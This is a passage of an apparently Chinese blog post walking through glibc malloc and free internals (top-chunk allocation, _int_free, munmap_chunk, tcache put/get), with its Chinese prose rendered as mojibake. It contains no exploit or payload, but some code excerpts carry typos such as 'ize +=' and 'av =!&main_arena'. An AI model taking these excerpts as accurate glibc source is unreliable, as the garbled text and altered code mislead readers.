class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœåé¢æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„binï¼Œå°±è·³åˆ°use_topä½¿ç”¨top chunkæ¥åˆ†é…</span></span><br><span class="line">    <span class="comment">// å¦‚æœåé¢æ‰¾åˆ°äº†åˆé€‚çš„binï¼Œé‚£ä¹ˆï¼š</span></span><br><span class="line">    <span class="comment">// 1. ç”¨best fitç®—æ³•æ‰¾åˆ°æœ€åˆé€‚å¤§å°çš„chunk</span></span><br><span class="line">    <span class="comment">// 2. å¯¹è¿™ä¸ªchunkè¿›è¡Œsplitï¼Œä¸€éƒ¨åˆ†è¿”å›ç»™ç”¨æˆ·ï¼Œ</span></span><br><span class="line">    <span class="comment">// å‰©ä½™éƒ¨åˆ†èµ‹å€¼ç»™malloc_stateä¸­çš„remainderï¼Œ</span></span><br><span class="line">    <span class="comment">// åŒæ—¶æ’å…¥åˆ°unsorted binå½“ä¸­</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å°è¯•ä»top-chunkä¸­åˆ†é…"><a href="#å°è¯•ä»top-chunkä¸­åˆ†é…" class="headerlink" title="å°è¯•ä»top chunkä¸­åˆ†é…"></a>å°è¯•ä»top chunkä¸­åˆ†é…</h3><p>è¿™æ˜¯_int_mallocä¸­æœ€åé‚£ä¸ªå¤§forå¾ªç¯çš„ç¬¬ä¸‰éƒ¨åˆ†ä»£ç ï¼Œåœ¨ä»large binåˆ†é…å¤±è´¥ä¹‹åï¼Œå‡†å¤‡ä»top chunkåˆ†é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// forå¾ªç¯çš„ç¬¬ä¸‰éƒ¨åˆ†ä»£ç </span></span><br><span class="line">  <span class="comment">// å‰é¢éƒ½åˆ†é…å¤±è´¥ï¼Œä»top chunkåˆ†é…</span></span><br><span class="line">use_top:</span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize(victim);</span><br><span class="line">  <span class="keyword">if</span> (size &gt;= (nb + MINSIZE)) &#123;</span><br><span class="line">    <span class="comment">// top chunkçš„å¤§å°å¦‚æœæ»¡è¶³è¦æ±‚ï¼Œåˆ†é…æˆåŠŸ</span></span><br><span class="line">    <span class="comment">// å‰©ä½™çš„éƒ¨åˆ†æˆä¸ºæ–°çš„top chunkï¼ŒåŒæ—¶ä¹Ÿä¼šæˆä¸ºremainder</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(victim, ...);</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (av-&gt;have_fastchunks) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœfast bin flagè¢«è®¾ç½®ï¼Œ</span></span><br><span class="line">    <span class="comment">// å†é‡æ–°release fast binçš„å†…å®¹åˆ°unsorted binä¸­ï¼Œ</span></span><br><span class="line">    <span class="comment">// å¹¶ä¸”é‡æ–°å¾—åˆ°è¯·æ±‚å¤§å°æ‰€åœ¨binçš„index</span></span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">      idx = smallbin_index(nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index(nb);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœtop chunkä¹Ÿä¸æ»¡è¶³è¯·æ±‚å¤§å°ï¼Œ</span></span><br><span class="line">    <span class="comment">// å°±ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å¢åŠ top chunkï¼Œæˆ–è€…å†å¼€è¾Ÿå‡ºä¸€å—heap</span></span><br><span class="line">    <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="freeå…¥å£"><a href="#freeå…¥å£" class="headerlink" title="freeå…¥å£"></a>freeå…¥å£</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem) &#123;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="type">void</span> (*hook)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = </span><br><span class="line">        atomic_forced_read(__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// part3</span></span><br><span class="line">  mchunkptr p = mem2chunk(mem);</span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p)) &#123;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    mstate ar_ptr = arena_for_chunk(p);</span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç åˆ†æˆäº†part1/2/3ä¸‰éƒ¨åˆ†ï¼š</p><ul><li>part1ï¼šè°ƒç”¨å›è°ƒå‡½æ•°ï¼Œè¿½ä»£ç å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªå›è°ƒå‡½æ•°ä¸ºNULL</li><li>part2ï¼šå…è®¸free(0)è¿™æ ·çš„è°ƒç”¨ï¼Œå³ä»€ä¹ˆéƒ½ä¸åšï¼Œç›´æ¥è¿”å›</li><li>part3ï¼šåˆ¤æ–­æ‰€é‡Šæ”¾çš„ç©ºé—´æ˜¯ä¸æ˜¯ä½¿ç”¨mmapåˆ†é…å¾—åˆ°çš„ï¼Œå¦‚æœæ˜¯mmapåˆ†é…å¾—åˆ°çš„ï¼Œå°±ä½¿ç”¨munmapæ¥é‡Šæ”¾ï¼Œå¦‚æœä¸æ˜¯çš„è¯ï¼Œå°±è°ƒç”¨_int_freeè¿™ä¸ªä¸»é‡Šæ”¾å‡½æ•°æ¥é‡Šæ”¾ï¼Œåé¢å°±æ¥é‡ç‚¹åˆ†æè¿™ä¸ªå‡½æ•°</li></ul><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>å…ˆè´´æµç¨‹</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_161840.png" alt=""></p><p>æ ¹æ®ä¸Šå›¾ï¼Œfreeæ—¶å…ˆæ˜¯åˆ¤æ–­chunk sizeæ˜¯ä¸æ˜¯å¤„åœ¨fast binçš„èŒƒå›´ï¼Œæ˜¯çš„è¯å°±æŠŠè¯¥chunkæ”¾å…¥fast binä¸­ï¼ŒæŠŠchunkæ”¾å…¥fast binçš„æ“ä½œæ˜¯ä¸€ä¸ªCASæ“ä½œ.</p><p>é€šè¿‡ä»£ç å®ç°:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &lt;= get_max_fast()) &#123;</span><br><span class="line">  free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">  fb = &amp;fastbin (av, idx);</span><br><span class="line">  <span class="comment">// Atomically link P to its fastbin: </span></span><br><span class="line">  <span class="comment">// P-&gt;FD = *FB; *FB = P;</span></span><br><span class="line">  mchunkptr old = *fb, old2;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    old2 = old;</span><br><span class="line">    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);</span><br><span class="line">  &#125; <span class="keyword">while</span> ((old = </span><br><span class="line">    catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç é™¤äº†å‰é¢æåˆ°çš„CASæ“ä½œï¼Œè¿˜æœ‰ä¸¤ä¸ªç‚¹å€¼å¾—æ³¨æ„ä¸€ä¸‹ï¼š</p><ul><li>ä½¿ç”¨free<em>perturbå‡½æ•°æ¥æ”¹å˜ä¸€ä¸‹æ‰€é‡Šæ”¾ç©ºé—´çš„åŸæ¥å†…å®¹ï¼Œè¿™ä¸ªè¦åœ¨è®¾ç½®äº†glibc.malloc.perturbæˆ–è€…MALLOC_PERTURB</em>ç¯å¢ƒå˜é‡çš„æ—¶å€™æ‰ä¼šèµ·ä½œç”¨</li><li>PROTECT_PTRçš„åº•å±‚åŸç†å®é™…ä¸Šæ˜¯ä¸€ç§safe-linkingçš„å®‰å…¨æœºåˆ¶ï¼Œå®ƒåˆ©ç”¨äº†ASLRï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰ä¸­çš„éšæœºæ€§ï¼Œå¯ä»¥å¾ˆæœ‰æ•ˆçš„é˜²æ­¢UAFæ¼æ´ï¼Œè¿™éƒ¨åˆ†å¾ˆæœ‰æ„æ€ï¼Œé»‘å®¢çš„å…¥é—¨é¢˜ï¼Œä»¥åæœ‰æ—¶é—´å†ä¸“é—¨å†™ç¯‡æ–‡ç« ç ”ç©¶ä¸‹ï¼Œè¿™é‡Œåªç®€å•æä¸‹</li></ul><p>å¦‚æœchunk sizeä¸å±äºfast binçš„èŒƒå›´ï¼Œç»§ç»­åˆ¤æ–­æ˜¯ä¸æ˜¯ç”±mmapåˆ†é…äº§ç”Ÿï¼Œå¦‚æœç”±mmapåˆ†é…äº§ç”Ÿï¼Œåˆ™ä½¿ç”¨munmap_chunkè¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œfreeï¼Œmunmap_chunkçš„ä¸»è¦ä»£ç ä¹Ÿä¸€å¹¶åˆ—åœ¨äº†ä¸‹é¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœç©ºé—´æ˜¯ç”±mmapåˆ†é…çš„ï¼Œåˆ™ä½¿ç”¨munmap_chunké‡Šæ”¾</span></span><br><span class="line"><span class="keyword">if</span> (chunk_is_mmapped(p)) &#123;</span><br><span class="line">  munmap_chunk (p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// munmap_chunkçš„ä¸»è¦å®ç°</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">munmap_chunk</span><span class="params">(mchunkptr p)</span> &#123;</span><br><span class="line">  <span class="comment">// GLROæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²è¿æ¥å®ï¼Œè¿™é‡ŒæŠŠdl_pagesize</span></span><br><span class="line">  <span class="comment">// å˜æˆäº†_dl_pagesizeï¼Œ_dl_pagesizeçš„å€¼æ˜¯4096</span></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO(dl_pagesize);</span><br><span class="line">  INTERNAL_SIZE_T size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="type">uintptr_t</span> mem = (<span class="type">uintptr_t</span>)chunk2mem(p);</span><br><span class="line">  <span class="type">uintptr_t</span> block = (<span class="type">uintptr_t</span>)p - prev_size(p);</span><br><span class="line">  <span class="type">size_t</span> total_size = prev_size(p) + size;</span><br><span class="line">  <span class="comment">// é€šè¿‡ä¸‹é¢è¿™ä¸ªcheckå¯ä»¥å‘ç°ï¼Œmmapåˆ†é…çš„</span></span><br><span class="line">  <span class="comment">// ç©ºé—´åœ°å€å’Œå¤§å°éƒ½å¿…é¡»æ˜¯pagesizeçš„å€æ•°</span></span><br><span class="line">  <span class="keyword">if</span> (((block | total_size) &amp; (pagesize - <span class="number">1</span>)) != <span class="number">0</span> ||</span><br><span class="line">      (!powerof2(mem &amp; (pagesize - <span class="number">1</span>))))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;invalid pointer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atomic_decrement(&amp;mp_.n_mmaps);</span><br><span class="line">  <span class="type">atomic_add</span>(&amp;mp_.mmapped_mem, -total_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç»§ç»­è°ƒç”¨__munmapæ¥è¿›è¡Œé‡Šæ”¾ï¼Œ</span></span><br><span class="line">  <span class="comment">// è¿½è¸ªä»£ç å¯ä»¥çœ‹åˆ°æ˜¯ç”±_vm_deallocateé‡Šæ”¾çš„ç©ºé—´</span></span><br><span class="line">  __munmap((<span class="type">char</span> *)block, total_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåˆ¤æ–­çš„åŸç†å¾ˆç®€å•ï¼Œéƒ½çŸ¥é“mallocçš„chunk headerä¸­æœ‰Aã€Mã€P 3ä¸ªbitçš„flagï¼Œå…¶ä¸­çš„Må°±æ˜¯è¡¨ç¤ºè¯¥chunkæ˜¯ä¸æ˜¯ç”±mmapç³»ç»Ÿè°ƒç”¨äº§ç”Ÿï¼Œè¿™ä¸ªåˆ¤æ–­å®å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure><p>å¦‚æœchunkä¸æ˜¯ç”±mmapåˆ†é…ï¼Œå…ˆåˆ¤æ–­è¯¥chunkçš„prev chunkæ˜¯ä¸æ˜¯free stateï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œéœ€è¦å’Œprev chunkè¿›è¡Œmergeï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†åˆ¤æ–­next chunkæ˜¯ä¸æ˜¯top chunkï¼Œæ˜¯çš„è¯ï¼Œé‡æ–°è®¾ç½®top chunkï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (nextchunk == av-&gt;top) &#123;</span><br><span class="line">  ize += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">  check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœnext chunkä¸æ˜¯top chunkï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼Œå¦‚æœæ˜¯free stateçš„è¯ï¼Œåˆ™ç»§ç»­mergeï¼Œå¦‚æœæ˜¯allocated stateçš„è¯ï¼Œåˆ™æ”¹å˜å…¶P(PREV_INUSE) flagï¼Œæœ€åæŠŠè¦freeçš„chunkæ”¾å…¥unsorted binä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  unlink_chunk (av, nextchunk);</span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">// not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">// been given one chance to be used in malloc.</span></span><br><span class="line">bck = unsorted_chunks(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">set_head(p, size | PREV_INUSE);</span><br><span class="line">set_foot(p, size);</span><br></pre></td></tr></table></figure><p>æœ€åè¿˜è¦çœ‹ä¸‹mergeè¿‡åçš„chunk sizeæ˜¯å¦è¾¾åˆ°FASTBIN_CONSOLIDATION_THRESHOLDè¿™ä¸ªé˜ˆå€¼ï¼ˆé»˜è®¤å¤§å°æ˜¯65536ï¼‰ï¼Œè¾¾åˆ°çš„è¯è¦åšä¸€æ¬¡malloc_consolidateæ“ä½œï¼ˆfree fast binä¸­çš„chunkåˆ°unsorted binä¸­ï¼‰ï¼Œå¯¹émain arenaè¿˜è¦åšä¸€ä¸‹heap_trimæ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">  <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">  <span class="keyword">if</span> (av =!&amp;main_arena) &#123;</span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸­çš„heap_for_ptrè¿™ä¸ªå®æ˜¯ç”¨æ¥å¾—åˆ°å½“å‰heapçš„heap_infoçš„ï¼Œä»å®ƒçš„å®šä¹‰å¯ä»¥éªŒè¯heap_infoè¿™ä¸ªæ•°æ®ç»“æ„çš„ä¸€äº›ç‰¹æ€§ï¼Œå€¼å¾—çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr)                      \</span></span><br><span class="line"><span class="meta">  ((heap_info *)((unsigned long)(ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br></pre></td></tr></table></figure><h1 id="æœ‰tcache"><a href="#æœ‰tcache" class="headerlink" title="æœ‰tcache"></a>æœ‰tcache</h1><p>ä»¥ä¸Šéƒ½æ˜¯ä¸è€ƒè™‘tcacheçš„æƒ…å†µï¼ˆlibc&lt;2.26)ï¼Œæœ‰tcacheå…¶å®å˜åŒ–ä¹Ÿå¹¶ä¸æ˜¯å¤ªå¤§ã€‚</p><p>ç›¸å…³æ•°æ®ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>tcacheä¹Ÿæ˜¯ä½¿ç”¨ ç±»ä¼¼ bins æ–¹å¼æ¥ç®¡ç†tcache ã€‚</p><p><strong>tcache_perthread_structæ˜¯æ•´ä¸ªtcache</strong></p><p>æ¯ä¸€é¡¹ç”± ç›¸åŒå¤§å°çš„ chunk é€šè¿‡ tcache_entry ä½¿ç”¨å•å‘é“¾è¡¨é“¾æ¥ï¼ˆç±»ä¼¼äºfastbinçš„é“¾æ¥æ–¹å¼ï¼‰ã€‚</p><p><strong>counts ç”¨äºè®°å½• entries ä¸­æ¯ä¸€é¡¹å½“å‰é“¾å…¥çš„ chunk æ•°ç›®ï¼Œ æœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunkã€‚</strong></p><p>tcache_entry ç”¨äºé“¾æ¥ chunk çš„ç»“æ„ä½“ï¼Œ å…¶ä¸­å°±ä¸€ä¸ª next æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªç›¸åŒå¤§å°çš„ chunk.</p><h2 id="åŸºç¡€æ“ä½œ"><a href="#åŸºç¡€æ“ä½œ" class="headerlink" title="åŸºç¡€æ“ä½œ"></a>åŸºç¡€æ“ä½œ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// å¢åŠ åˆ°é“¾è¡¨å¤´éƒ¨</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// è®°å½•å½“å‰ bin çš„ chunkæ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™æ®µä»£ç èƒ½æ›´å¥½åœ°ç†è§£ä¸Šé¢ä¸¤ä¸ªç»“æ„ä½“.</p><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>ç”¨äºæŠŠä¸€ä¸ª chunk æ”¾åˆ° æŒ‡å®šçš„ tcache-&gt;entries é‡Œé¢å»ï¼Œ tc_idx é€šè¿‡ csize2tidx (nb) è®¡ç®—å¾—åˆ° ï¼ˆnbæ˜¯ chunk çš„å¤§å°ï¼‰ã€‚</p><p>å®ƒé¦–å…ˆæŠŠ chunk+2<em>SIZE_SZ ï¼ˆå°±æ˜¯é™¤å» header éƒ¨åˆ†ï¼‰ å¼ºåˆ¶è½¬æ¢æˆ tcache_entry </em> ç±»å‹ï¼ŒeæŒ‡é’ˆä¹Ÿå°±æŒ‡å‘äº†mem,ç„¶åä¿®æ”¹memçš„å¤´å­—æ®µ(ç°åœ¨è¢«è§†ä¸ºenteryçš„nextæŒ‡é’ˆ)ä¸ºä¹‹å‰çš„è¯¥enteryçš„ç¬¬ä¸€ä¸ªchunk,ç„¶åå†æŠŠenteryçš„å€¼æ”¹ä¸ºeæŒ‡é’ˆ,æœ€åæŠŠ tcache-&gt;counts[tc_idx] åŠ  1 ï¼Œè¡¨ç¤ºæ–°å¢äº†ä¸€ä¸ª chunk åˆ° è¯¥ è¡¨é¡¹ã€‚</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>ç®€å•æ¥è¯´å°±æ˜¯putçš„é€†æ“ä½œ,ä¸å¤šè¯´.</p><p><strong>å¾—åˆ°tc_idxçš„å®å®šä¹‰</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + 